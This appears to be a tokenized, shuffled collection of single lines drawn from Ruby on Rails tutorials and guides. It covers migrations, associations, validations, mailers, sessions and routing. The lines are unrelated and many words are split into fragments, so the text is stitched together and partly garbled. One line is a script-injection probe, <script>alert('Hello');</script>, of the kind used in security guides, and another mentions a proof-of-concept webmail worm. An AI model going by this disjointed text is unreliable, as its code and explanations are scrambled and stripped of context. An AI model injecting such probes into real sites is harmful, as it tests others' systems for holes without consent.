▁* ▁Otherwise , ▁an ▁array ▁with ▁the ▁argument ▁as ▁its ▁single ▁element ▁is ▁returned .
▁N at ur ally , ▁Rails ▁allows ▁us ▁to ▁override ▁the ▁default , ▁in ▁this ▁case ▁using ▁the ▁\ k ode { source } ▁parameter ▁( as ▁show n ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships }), ▁which ▁explicitly ▁tell s ▁Rails ▁that ▁the ▁source ▁of ▁the ▁\ k ode { following } ▁array ▁is ▁the ▁set ▁of ▁\ k ode { followed } ~ id s .
▁This ▁guide ▁cover s ▁Rails ▁integration ▁with ▁Rack ▁and ▁inter f ac ing ▁with ▁other ▁Rack ▁ components .
▁-- ▁create _ table (: comments )
▁( If ▁you ▁are ▁using ▁a ▁version ▁of ▁Ruby ▁other ▁than ▁ 2▖0▖ 0, ▁you ▁should ▁change ▁the ▁Ruby ▁version ▁line ▁according ly ▖)
▁You ▁should ▁use ▁` has _ many ▁: through ` ▁if ▁you ▁need ▁validations , ▁callbacks , ▁or ▁extra ▁attributes ▁on ▁the ▁join ▁model .
▁By ▁default , ▁if ▁the ▁ de le g ation ▁raise s ▁` NoMethodError ` ▁and ▁the ▁ target ▁is ▁` nil ` ▁the ▁exception ▁is ▁pro p a g at ed ▖
▁ Activ ating ▁fixture ▁users .
▁Now ▁that ▁we ' ve ▁created ▁the ▁basic ▁model , ▁we ' ll ▁add ▁some ▁validations ▁to ▁enforce ▁the ▁desired ▁design ▁constraints .
▁The ▁method ▁` change ` ▁allows ▁you ▁to ▁get ▁a ▁new ▁date ▁which ▁is ▁the ▁same ▁as ▁the ▁receiver ▁except ▁for ▁the ▁given ▁ year , ▁ month , ▁or ▁day :
▁validates ▁: email _ confirmation , ▁presence : ▁true
▁The ▁main ▁requirement ▁is ▁that ▁ enumerable ▁objects ▁must ▁implement ▁an ▁\ k ode { each } ▁method ▁to ▁iterate ▁through ▁the ▁collection .
▁To ▁fix ▁the ▁error ▁and ▁get ▁to ▁\ passing , ▁all ▁we ▁need ▁to ▁do ▁is ▁return ▁\ k ode { false } ▁if ▁the ▁remember ▁digest ▁is ▁\ k ode { nil }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed } .
▁foreign _ key : ▁" p at r on _ id "
▁We ▁can ▁then ▁test ▁for ▁the ▁right ▁title ▁using ▁code ▁like ▁Listing ~\ ref { code : layout _ links _ test _ signup _ full _ title _ helper } ▁( which ▁extend s ▁the ▁solution ▁from ▁the ▁previous ▁exercise ) .
▁has _ many ▁: p ar a gr a ph s
▁One ▁inter est ing ▁thing ▁about ▁this ▁construction ▁is ▁that ▁it ▁was ▁original ly ▁added ▁to ▁Ruby ▁on ▁Rails , ▁and ▁people ▁like d ▁it ▁so ▁much ▁that ▁it ▁has ▁now ▁been ▁incorporate d ▁into ▁ core ▁Ruby .
▁ ╼ ▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code .
▁Over ▁the ▁course ▁of ▁the ▁next ▁three ▁chapter s , ▁we ' ll ▁cover ▁all ▁of ▁the ▁other ▁ en tries ▁in ▁Table ~\ ref { table : RESTful _ users } ▁as ▁we ▁fill ▁in ▁all ▁the ▁actions ▁necessary ▁to ▁make ▁Users ▁a ▁fully ▁RESTful ▁resource .
▁* ▁` lo o p : ▁true `, ▁ lo o p s ▁the ▁ video ▁once ▁it ▁get s ▁to ▁the ▁end .
▁The ▁effect ▁of ▁this ▁line ▁is ▁to ▁look ▁for ▁a ▁file ▁called ▁\ k ode { app / views / layouts / \_ shim ▖ html ▖ erb }, ▁evaluate ▁its ▁contents , ▁and ▁insert ▁the ▁results ▁into ▁the ▁view
▁FROM ▁orders
▁query ▖ distinct ( false )
▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } .
▁Note ▁that ▁the ▁routes ▁for ▁signin ▁and ▁ signout ▁are ▁custom , ▁but ▁the ▁route ▁for ▁creating ▁a ▁session ▁is ▁simply ▁the ▁default ▁( i ▖ e ▖ , ▁\ k ode { [ resource ▁name ] \_ path }) .
▁Ou r ▁task ▁in ▁this ▁section ▁is ▁to ▁define ▁the ▁ mailers ▁and ▁views ▁with ▁links ▁containing ▁the ▁activation ▁token ▁and ▁email ▁address ▁ associated ▁with ▁the ▁account ▁to ▁be ▁ activated .
▁< p >
▁You ▁m ight ▁have ▁expected ▁an ▁instance ▁of ▁ Array .
▁m o un t ▁Blorgh :: Engine ▁=> ▁"/ blorgh "
▁The ▁SQL ▁that ▁would ▁be ▁executed :
▁class ▁Create Picture s ▁< ▁ActiveRecord :: Migration
▁<%= ▁@ article ▖ text ▁%>
▁A ▁current ▁user ' s ▁profile .
▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } .
▁The ▁combination ▁will ▁ const it ute ▁a ▁\ emph { Users ▁resource }, ▁which ▁will ▁allow ▁us ▁to ▁think ▁of ▁users ▁as ▁objects ▁that ▁can ▁be ▁created , ▁read , ▁updated , ▁and ▁delete d ▁through ▁the ▁web ▁via ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol } { HTTP ▁protocol } .
▁This ▁application ▁is ▁used ▁as ▁a ▁m o un ting ▁point ▁for ▁the ▁engine ,╼ to ▁make ▁testing ▁the ▁engine ▁ extremely ▁simple ▖
▁We ▁can ▁do ▁this ▁by ▁passing ▁the ▁\ k ode { allow \_ nil : ▁true } ▁option ▁to ▁\ k ode { validates }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : allow _ blank _ password } .
▁Creat ing ▁Active ▁Record ▁Model s
▁orders ▖ clear
▁#### ▁Rendering ▁HTML
▁Now ▁that ▁we ▁have ▁made ▁the ▁controller ▁and ▁view , ▁we ▁need ▁to ▁tell ▁Rails ▁when ▁we ╼ w an t ▁" Hello , ▁Rails !" ▁to ▁show ▁up ▖
▁At ▁the ▁time , ▁we ▁needed ▁that ▁method ▁only ▁in ▁the ▁Users ▁controller , ▁but ▁now ▁we ▁find ▁that ▁we ▁need ▁it ▁in ▁the ▁Microposts ▁controller ▁as ▁well , ▁so ▁we ' ll ▁move ▁it ▁into ▁the ▁Application ▁controller , ▁which ▁is ▁the ▁base ▁class ▁of ▁all ▁controllers ▁( Section ~\ ref { sec : a _ controller _ class }) .
▁# ▁ Previous ly ▁in ▁Rails ▁4▖0
▁def ▁session _ store = ( store )
▁[1, ▁2, ▁3] ▖ sum ▁# ▁=> ▁6
▁ ╼ ▁$ ▁rake ▁db : migrate
▁Add ▁this ▁at ▁the ╼ bo t to m ▁of ▁the ▁template :
▁In ▁prepar ation ▁for ▁adding ▁users ▁to ▁our ▁site ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁the ▁first ▁\ k ode { link \_ to } ▁creates ▁a ▁ stub ▁link ▁of ▁the ▁form
▁address : ▁' smtp ▖ g mail ▖ com ',
▁* ▁Rails ▁4▖0 ▁encrypt s ▁the ▁contents ▁of ▁cookie - base d ▁sessions ▁if ▁` secret _ key _ base ` ▁has ▁been ▁set ▖
▁#### ▁ Module ▁Attributes
▁#### ▁Implement ing ▁De c or at or ▁ Pattern ▁Using ▁ ActiveSupport :: Concern
▁The ╼ specific ▁mailer ▁view ▁is ▁known ▁to ▁the ▁class ▁because ▁its ▁name ▁is ▁the ▁same ▁as ▁the ╼ mailer ▁method ▖
▁(\ emph { Hint } : ▁Your ▁first ▁step ▁should ▁be ▁to ▁\ emph { add } ▁\ k ode { admin } ▁to ▁the ▁list ▁of ▁ permitted ▁parameters ▁in ▁\ k ode { user \_ params } ▖)
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ▁will ▁complete ▁our ▁authentication ▁machinery ▁by ▁allow ing ▁users ▁to ▁log ▁in ▁and ▁out ▁of ▁the ▁application .
▁* ▁Rails ▁4▖0 ▁changed ▁how ▁` assert _ generate s `, ▁` assert _ recognizes `, ▁and ▁` assert _ routing ` ▁work ▖
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁this ▁class ▁contains ▁the ▁foreign ▁key ▖
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : users _ resource }, ▁the ▁routing ▁works , ▁but ▁there ' s ▁ still ▁no ▁page ▁there ▁( Figure ~\ ref { fig : user _ show _ unknown _ action _ 4 }) .
▁* ▁`: user _ name ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁user name ▁in ▁this ▁setting .
▁ Content - Type : ▁text / html ; ▁ cha r set = utf -8
▁Users ▁of ▁our ▁ demo ▁app ▁will ▁have ▁a ▁unique ▁\ k ode { integer } ▁identifie r ▁called ▁\ k ode { id }, ▁a ▁public ly ▁view able ▁\ k ode { name } ▁( of ▁type ▁\ k ode { string }), ▁and ▁an ▁\ k ode { email } ▁address ▁( also ▁a ▁\ k ode { string }) ▁that ▁will ▁double ▁as ▁a ▁user name .
▁The ▁he ar t ▁of ▁the ▁signup ▁page ▁is ▁a ▁\ emph { form } ▁for ▁ submitting ▁the ▁relevant ▁signup ▁information ▁( name , ▁email , ▁password , ▁confirmation ) .
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } .
▁Rails ▁can ▁render ▁ v a nil la ▁JavaScript :
▁### ▁` validates _ each `
▁ Migration s ▁provide ▁a ▁way ▁to ▁alter ▁the ▁structure ▁of ▁the ▁database ▁ increment ally , ▁so ▁that ▁our ▁data ▁model ▁can ▁ adapt ▁to ▁changing ▁requirements .
▁This ▁command ▁will ▁output ▁this ▁information :
▁" rubi es "▖ singularize ▁# ▁=> ▁" ruby "
▁Verify ▁that ▁the ▁new ▁sessions ▁form ▁render s ▁properly .
▁This ▁is ▁also ▁the ▁case ▁for ╼` store _ accessor s ` ▁base d ▁on ▁to p ▁of ▁` json ` ▁or ▁` h store ` ▁columns ▖
▁=> ▁" 1 ▁error "
▁The ▁result ing ▁test , ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test }, ▁is ▁an ▁excellent ▁exercise ▁in ▁reading ▁code .
▁Sprockets ▁does ▁not ▁add ▁any ▁new ▁methods ▁to ▁access ▁your ▁assets ▁- ▁you ▁ still ▁use ▁the ╼ familiar ▁` javascript _ include _ tag ` ▁and ▁` stylesheet _ link _ tag `:
▁Let ' s ▁see ▁how ▁this ▁works .
▁It ▁is ▁useful ▁for ▁idiom s ▁like ▁this :
▁We ▁see ▁here ▁that ▁the ▁\ k ode { empty ?}\ ▁method , ▁which ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁in ▁the ▁context ▁of ▁strings , ▁also ▁works ▁on ▁Rails ▁error ▁objects , ▁return ing ▁\ k ode { true } ▁for ▁an ▁empty ▁object ▁and ▁\ k ode { false } ▁otherwise .
▁def ▁ initialize
▁ K eep ▁in ▁mind ▁that ▁some ▁web ▁browsers ▁or ▁ proxy ▁server s ▁will ▁cache ▁this ▁type ▁of ▁redirect , ▁making ▁the ▁old ▁page ▁in accessible .
▁The ▁user ▁show ▁page ▁after ▁adding ▁a ▁Users ▁resource .
▁M i me :: Type ▖ register ▁' application / json - patch + json ', ▁: json _ patch
▁ ╼ ▁=> ▁" the ▁user "
▁render ▁action : ▁" edit "
▁Rails ▁includes ▁a ▁convenient ▁way ▁to ▁build ▁associations ▁in ▁fixtures , ▁like ▁this :
▁ Asset s ▁inside ▁subdirectories ▁can ▁also ▁be ▁access ed .
▁A ▖ x ▁# ▁=> ▁: a
▁Or ig in ally ▁created ▁by ▁To m ▁P re st on - W er n er ▁( c of ound er ▁of ▁\ href { http :// github ▖ com /}{ GitHub }) ▁and ▁later ▁a c q u ir ed ▁and ▁ scale d ▁by ▁\ href { http :// auto m at tic ▖ com /}{ A u to m at tic } ▁( the ▁make rs ▁of ▁\ href { http :// word press ▖ com /}{ Word P re s s }), ▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁A nother ▁ proof - of - concept ▁web mail ▁worm ▁is ▁N d u ja , ▁a ▁ cross - domain ▁worm ▁for ▁four ▁It a li an ▁web mail ▁ service s ▖
▁ (▖▖▖)
▁#### ▁ W r app ing ▁it ▁up
▁First , ▁add ▁` gem ▁' web - console ', ▁' ~ > ▁2▖0 ' ` ▁to ▁the ▁`: development ` ▁group ▁in ▁your ▁Gemfile ▁and ▁run ▁` bundle ▁install ` ▁( it ▁won ' t ▁have ▁been ▁included ▁when ▁you ▁upgrade d ▁Rails )▖
▁ ╼ ▁$ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁textColor ▁= ▁$ ( this )▖ data (" text - color ")
▁#### ▁ Options ▁for ▁` belongs _ to `
▁The ▁manifest ▁file ▁for ▁app - specific ▁CSS .
▁General ly ▁ speak ing , ▁it ' s ▁a ▁good ▁idea ▁for ▁the ▁development ▁and ▁production ▁ environments ▁to ▁match ▁as ▁close ly ▁as ▁possible , ▁which ▁includes ▁using ▁the ▁same ▁database , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁tutorial ▁we ' ll ▁always ▁use ▁SQLite ▁local ly ▁and ▁PostgreSQL ▁in ▁production .
▁### ▁` class _ eval (* args , ▁& block ) `
▁The ▁default ▁is ▁` ActionView :: Helpers :: Form Builder ` ▖
▁### ▁ Routing ▁concern s
▁One ▁example ▁is ▁the ▁\ k ode { to \_ s } ▁method ▁that ▁can ▁convert ▁virtual ly ▁any ▁object ▁to ▁a ▁string :
▁The ▁method ▁` split ` ▁ div ide s ▁an ▁array ▁by ▁a ▁ separator ▁and ▁returns ▁the ▁result ing ▁ ch un k s .
▁# ▁< id > 4 3 5 6 </ id >
▁E age r ▁Load ing ▁Associations
▁You ▁can ▁add ▁all ▁the ▁files ▁( a part ▁from ▁those ▁that ▁match ▁the ▁ignore ▁pattern s ▁in ▁\ k ode { ▖ gitignore }) ▁as ▁follows :
▁ ub section ▁basic _ image _ upload ▁( end )╼╼ ╼\ subsection { Image ▁validation } ▁% ▁( fold )╼\ label { sec : image _ validation }╼╼
▁S ince ▁a ▁word ▁\ emph { is ▁a } ▁string , ▁it ' s ▁more ▁natural ▁to ▁have ▁our ▁\ k ode { Word } ▁class ▁\ emph { in her it } ▁from ▁\ k ode { String }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : word _ class } .
▁< script > alert (' Hello ') ; </ script >
▁` id s ` ▁can ▁be ▁used ▁to ▁ pluck ▁all ▁the ▁ ID s ▁for ▁the ▁relation ▁using ▁the ▁table ' s ▁primary ▁key .
▁To ▁tell ▁Git ▁you ▁want ▁to ▁keep ▁the ▁changes , ▁use ▁the ▁\ k ode { commit } ▁command :
▁f ") ▁# ▁=> ▁true
▁This ▁is ▁a ▁hint ▁that ▁Rails ▁follows ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Model - view - controller } { model - view - controller } ▁( MVC ) ▁ ar ch ite c t ur al ▁pattern , ▁which ▁enforce s ▁a ▁ se p ar ation ▁between ▁`` domain ▁logic '' ▁( also ▁called ▁`` business ▁logic '') ▁from ▁the ▁input ▁and ▁present ation ▁logic ▁ associated ▁with ▁a ▁gra ph ical ▁user ▁interface ▁( GUI ) .
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { first \_ app } ▁directory .
▁Of ▁course , ▁we ▁also ▁want ▁to ▁validate ▁the ▁presence ▁of ▁email ▁addresses .
▁The ▁SQL ▁that ▁would ▁be ▁executed ▁would ▁be ▁something ▁like ▁this :
▁$ ▁bin / rails ▁generate ▁scaffold ▁article ▁title : string ▁text : text
▁ Q U E RY ▁P LA N
▁Set ▁to ▁` true ` ▁by ▁default ▁in ▁` development ▖ rb ` .
▁#### ▁M a k ing ▁In line ▁A tt a ch ment s
▁# ▁ Remember s ▁a ▁user ▁in ▁the ▁database ▁for ▁use ▁in ▁ persistent ▁sessions .
▁You ▁may ▁restrict ▁the ▁ listing ▁to ▁the ▁routes ▁that ▁map ▁to ▁a ▁particular ▁controller ▁setting ▁the ▁` C ON T R O L L ER ` ▁environment ▁variable :
▁* ▁` config ▖ active _ record ▖ schema _ format ` ▁control s ▁the ▁format ▁for ▁ dump ing ▁the ▁database ▁ schema ▁to ▁a ▁file ▖
▁In ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users }, ▁we ▁will ▁use ▁the ▁association ▁of ▁users ▁and ▁microposts ▁both ▁to ▁display ▁all ▁of ▁a ▁user ' s ▁microposts ▁and ▁to ▁construct ▁a ▁Twitter - like ▁micropost ▁feed .
▁G oodnessValidator ▖ new ( person )▖ validate
▁A ▁mockup ▁of ▁the ▁`` forgot ▁password '' ▁form .
▁### ▁ Cookie s ▁serializ er
▁( N o w ▁you ' re ▁in ▁a ▁position ▁to ▁understand ▁the ▁code ▁in ▁Listing ~\ ref { code : digest _ method }, ▁which ▁uses ▁the ▁ ternary ▁operator ▁to ▁define ▁the ▁ bcrypt ▁\ k ode { cost } ▁variable ▖)
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test } .
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁100 0,
▁T ry ▁adding ▁one ▁step ▁at ▁a ▁time , ▁running
▁ ╼ ▁> > ▁x ▁= ▁1
▁This ▁mix ing ▁of ▁the ▁two ▁string ▁types ▁is ▁common ▁in ▁Ruby ; ▁see ▁Section ~\ ref { sec : string s } ▁for ▁more ▁information .
▁It ▁also ▁defines ▁` Date ▖ yesterday ` ▁and ▁` Date ▖ tomorrow `, ▁and ▁the ▁instance ▁ predicate s ▁` past ?` , ▁` today ?` , ▁and ▁` future ?` , ▁all ▁of ▁them ▁relative ▁to ▁` Date ▖ current ` .
▁In ▁this ▁section , ▁we ' ll ▁add ▁\ emph { ordering } ▁and ▁\ emph { dependency } ▁to ▁microposts , ▁while ▁also ▁testing ▁that ▁the ▁\ k ode { user ▖ microposts } ▁method ▁actually ▁returns ▁an ▁array ▁of ▁microposts .
▁After :
▁* ▁T w o ▁spaces , ▁no ▁ tab s ▁( for ▁indentation ) .
▁For ╼ example :
▁The ▁method ▁` in _ groups ` ▁ split s ▁an ▁array ▁into ▁a ▁certain ▁number ▁of ▁ groups ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ profile _ test }
▁A ▁single ▁entry ▁in ▁the ▁routing ▁file , ▁such ▁as :
▁The ▁layout ▁name ╼ ne ed s ▁to ▁be ▁the ▁same ▁as ▁your ▁mailer , ▁such ▁as ▁` user _ mailer ▖ html ▖ erb ` ▁and ╼` user _ mailer ▖ text ▖ erb ` ▁to ▁be ▁automatically ▁recognize d ▁by ▁your ▁mailer ▁as ▁a ╼ layout .
▁ Http ▁only ▁cookies ▁can ▁be ▁used ▁from ▁ IE ▁ v 6 .
▁The ▁\ emph { Rails ▁Tutorial } ▁take s ▁an ▁in t u i tive ▁approach ▁to ▁testing ▁that ▁emphasize s ▁the ▁behavior ▁of ▁the ▁application ▁rather ▁than ▁its ▁precise ▁implementation , ▁a ▁variant ▁of ▁test - driven ▁development ▁( TDD ) ▁known ▁as ▁behavior - driven ▁development ▁( B D D ) .
▁ /* ▁ footer ▁* /
▁( Re call ▁from ▁Listing ~\ ref { code : follow _ form _ partial } ▁that ▁this ▁is ▁a ▁\ k ode { div } ▁that ▁wrap s ▁the ▁form , ▁not ▁the ▁form ▁itself ▖)
▁Ou r ▁primary ▁purpose ▁in ▁this ▁section ▁is ▁to ▁render ▁all ▁the ▁microposts ▁for ▁each ▁user .
▁* ▁` create _ association ( attributes ▁= ▁{}) `
▁A ▁red ▁( failing ) ▁test ▖ ~\ href { http :// railstutorial ▖ org / images / figures / r ed _ failing _ spec _4_0 - full ▖ png }{( full ▁size )}
▁class ▁Create Article s ▁< ▁ActiveRecord :: Migration
▁These ▁are ▁the ╼ ▁fields ▁that ▁Active ▁Record ▁will ▁look ▁for ▁when ▁you ▁create ▁associations ▁between ╼ ▁your ▁models .
▁Consider ing ▁ various ▁id io sy n c ra tic ▁customizations , ▁there ▁are ▁ probably ▁as ▁many ▁development ▁ environments ▁as ▁there ▁are ▁Rails ▁programmer s .
▁We ▁also ▁include ▁an ▁\ emph { an ch or } ▁tag ~\ k ode { a }, ▁which ▁creates ▁links ▁to ▁the ▁given ▁URL ▁( called ▁an ▁`` href '' , ▁or ▁`` h y p er text ▁reference '' , ▁in ▁the ▁context ▁of ▁an ▁an ch or ▁tag ) :
▁The ▁Rails ▁team ▁is ▁commit ted ▁to ▁not ▁making ▁any ▁break ing ▁changes ▁to ▁public ▁API ▁a cross ▁release s ▁without ▁going ▁through ▁a ▁full ▁d eprecation ▁c y c le ▖
▁class ▁ Template ▁< ▁ :: Tilt :: Template
▁To ▁release ▁the ▁pro mp t ▁and ▁con t in ue ▁execut ion ▁of ▁the ▁application , ▁ press ▁ Ctrl - D , ▁then ▁remove ▁the ▁\ k ode { debugger } ▁line ▁from ▁the ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : debugger _ remove d }) .
▁E xception s ▁and ▁exception ▁handling ▁are ▁some what ▁advanced ▁Ruby ▁subject s , ▁and ▁we ▁won ' t ▁need ▁them ▁much ▁in ▁this ▁book .
▁Extensions ▁to ▁` E n um er able `
▁X - Cache : ▁H IT
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo .
▁Next , ▁why ▁does ▁the ▁\ k ode { data - turbolinks - track } ▁key / value ▁pair ▁use ▁the ▁old - style ▁h ashrocket ▁syntax ?
▁ Each ▁nesting ▁level ▁will ▁merge ▁inherit ed ▁defaults ▁in ▁addition ▁to ▁their ▁own .
▁C ur r ent ly , ▁Active ▁Record ▁ suppress es ▁errors ▁raised ╼ with in ▁` after _ rollback ` ▁or ▁` after _ commit ` ▁callbacks ▁and ▁only ▁ print s ▁them ▁to ╼ the ▁log s ▖
▁The ▁view ▁for ▁the ▁\ k ode { help } ▁action ▁is ▁analogous ▁( Listing ~\ ref { code : raw _ help _ view }) .
▁ Adding ▁the ▁complete d ▁feed ▁to ▁the ▁User ▁model .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : demo _ users _ resource }, ▁this ▁column ▁is ▁created ▁automatically , ▁and ▁is ▁used ▁by ▁Rails ▁to ▁identify ▁each ▁ row ▁unique ly .
▁Because ▁this ▁could ▁easily ▁happen ▁in ▁the ▁normal ▁course ▁of ▁using ▁the ▁application , ▁such ▁users ▁will ▁be ▁forward ed ▁to ▁the ▁login ▁page ▁with ▁a ▁helpful ▁message , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : login _ page _ protected _ mockup } .
▁We ▁can ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁to ▁pass ▁by ▁remov ing ▁the ▁\ k ode { raise } ▁and ▁rest or ing ▁the ▁original ▁\ k ode { current \_ user } ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ no _ raise } .
▁### ▁Using ▁partials ▁to ▁clean ▁up ▁duplication ▁in ▁views
▁Validat ing ▁the ▁presence ▁of ▁an ▁\ k ode { email } ▁attribute ▖
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁un gr a m m at ical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁and ▁`` 2 ▁microposts '' ▁using ▁the ▁\ k ode { pluralize } ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : signup _ error _ messages } .
▁The ▁new ▁methods ▁are ▁` qualified _ const _ defined ?` , ▁` qualified _ const _ get `, ▁and ╼` qualified _ const _ set ` ▖
▁You ▁can ▁pass ▁a ▁collection ▁of ▁Active ▁Record ▁objects ▖
▁If ▁you ▁want ▁to ▁be ▁sure ▁that ▁an ▁association ▁is ▁present , ▁you ' ll ▁need ▁to ▁test ╼ w hether ▁the ▁ associated ▁object ▁itself ▁is ▁present , ▁and ▁not ▁the ▁foreign ▁key ▁used ╼ to ▁map ▁the ▁association .
▁create ▁mode ▁100 64 4 ▁README ▖ md
▁belongs _ to ▁: supplier , ▁ inverse _ of : ▁: account
▁# ▁so ▁we ▁can ▁ safe ly ▁require ▁p ry ▁here
▁ Adding ▁a ▁method ▁for ▁ generating ▁token s .
▁ ge ▁as ▁of ▁Rails ~ 5 , ▁and ▁in ▁previous ▁versions ▁of ▁Rails ▁the ▁validations ▁are ▁required ▖ ▁We ' ll ▁plan ▁to ▁leave ▁them ▁in ▁for ▁completeness , ▁but ▁it ' s ▁worth ▁be ar ing ▁in ▁mind ▁that ▁you ▁may ▁see ▁these ▁validations ▁omitted ▁in ▁other ▁people ' s ▁code ▖ )╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 000 3 a 9 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁relationship _ validations ▁( end )╼╼ ▁\ subsection { Follow ed ▁users } ▁% ▁( fold )╼ ▁\ label { sec : following }╼╼
▁For ▁simple ▁class ▁modification s , ▁use ▁` Class # class _ eval ` ▖
▁Whi le ▁inheritance ▁is ▁a ▁powerful ▁idea , ▁in ▁the ▁case ▁of ▁ palindrome s ▁it ▁m ight ▁be ▁even ▁more ▁natural ▁to ▁add ▁the ▁\ k ode { palindrome ?}\ ▁method ▁to ▁the ▁\ k ode { String } ▁class ▁itself , ▁so ▁that ▁( a mong ▁other ▁things ) ▁we ▁can ▁call ▁\ k ode { palindrome ?}\ ▁on ▁a ▁string ▁literal , ▁which ▁we ▁current ly ▁can ' t ▁do :
▁ Given ▁a ▁string ▁with ▁a ▁ qualified ▁constant ▁reference ▁expression , ▁` deconstantize ` ▁remove s ▁the ▁right most ▁segment , ▁generally ▁leav ing ▁the ▁name ▁of ▁the ▁constant ' s ▁ container :
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full \_ title } ▁method ▁is ▁\ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { automagically } ▁available ▁in ▁all ▁our ▁views .
▁To ▁add ▁an ▁alter n ate ▁new ▁action ▁using ▁the ▁`: on ` ▁shortcut :
▁class ▁ Comments Controller ▁< ▁Application Controller
▁### ▁App ly ing ▁a ▁default ▁scope
▁Now ▁that ▁we ▁have ▁a ▁failing ▁test , ▁we ' re ▁ready ▁to ▁implement ▁ friendly ▁ forwarding
▁# ▁Change ▁the ▁path ▁that ▁assets ▁are ▁served ▁from ▁config ▖ assets ▖ prefix ▁= ▁"/ assets "
▁The ▁default ▁is ▁an ▁empty ▁string .
▁To ▁avoid ▁integration ▁ head a ch es ▁later ▁on , ▁it ' s ▁also ▁a ▁good ▁idea ▁to ▁deploy ▁the ▁app ▁to ▁Heroku ▁even ▁at ▁this ▁ early ▁stage .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁Bootstrap , ▁which ▁in ▁Rails ▁applications ▁can ▁be ▁accomplish ed ▁with ▁the ▁\ text tt { bootstrap - sass } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ sass } .
▁ ActionView :: Missing Template :
▁Recall ▁from ▁Section ~\ ref { sec : destroy ing _ users } ▁that ▁site ▁administrator s ▁have ▁the ▁power ▁to ▁\ emph { destroy } ▁users .
▁On ▁subsequent ▁login ▁attempt s , ▁the ▁ forwarding ▁URL ▁should ▁ r ever t ▁to ▁the ▁default ▁( i ▖ e ▖ , ▁the ▁profile ▁page ) .
▁Having ▁discuss ed ▁how ▁to ▁store ▁the ▁user ' s ▁remember ▁token ▁in ▁a ▁cookie ▁for ▁later ▁use , ▁we ▁now ▁need ▁to ▁learn ▁how ▁to ▁retrieve ▁the ▁user ▁on ▁subsequent ▁page ▁views .
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁------------ ---------------- ---------------- ▁|
▁TIP : ▁If ▁your ▁application ▁has ▁many ▁RESTful ▁routes , ▁using ▁`: only ` ▁and ▁`: except ` ▁to ▁generate ▁only ▁the ▁routes ▁that ▁you ▁actually ▁need ▁can ▁ cut ▁down ▁on ▁memory ▁use ▁and ▁ speed ▁up ▁the ▁routing ▁process .
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ out _ method } .
▁There ▁are ▁situation s ▁where ▁you ▁need ▁to ▁edit ▁an ▁email ▁before ▁it ' s ╼ deliver ed ▖
▁A ▁relative ly ▁new , ▁and ▁un us u al , ▁form ▁of ▁entry ▁point s ▁are ▁ banner ▁a d ve r t is e ment s ▖
▁ Follow ing ▁the ▁models ▁from ▁Listing ~\ ref { code : default _ controller _ test }, ▁you ▁can ▁ probably ▁guess ▁the ▁right ▁test , ▁which ▁is ▁show n ▁in ▁Listing ~\ ref { code : about _ test } .
▁The ▁association ▁\ k ode { count } ▁method ▁is ▁ s m ar t , ▁and ▁perform s ▁the ▁count ▁directly ▁in ▁the ▁database .
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active '
▁< option ▁value = "1" ▁select ed =" select ed "> David </ option >
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁minutes ▁that ▁defaults ▁to ▁the ▁minutes ▁for ▁the ▁time ▁provided .
▁( Note ▁that , ▁in ▁the ▁context ▁of ▁Listing ~\ ref { code : token _ digest _ self } ▁and ▁Listing ~\ ref { code : token _ digest _ class _ self }, ▁\ k ode { self } ▁is ▁the ▁\ k ode { User } ▁class , ▁whereas ▁the ▁other ▁uses ▁of ▁\ k ode { self } ▁in ▁the ▁User ▁model ▁refer ▁to ▁a ▁user ▁object ▁\ emph { instance } .
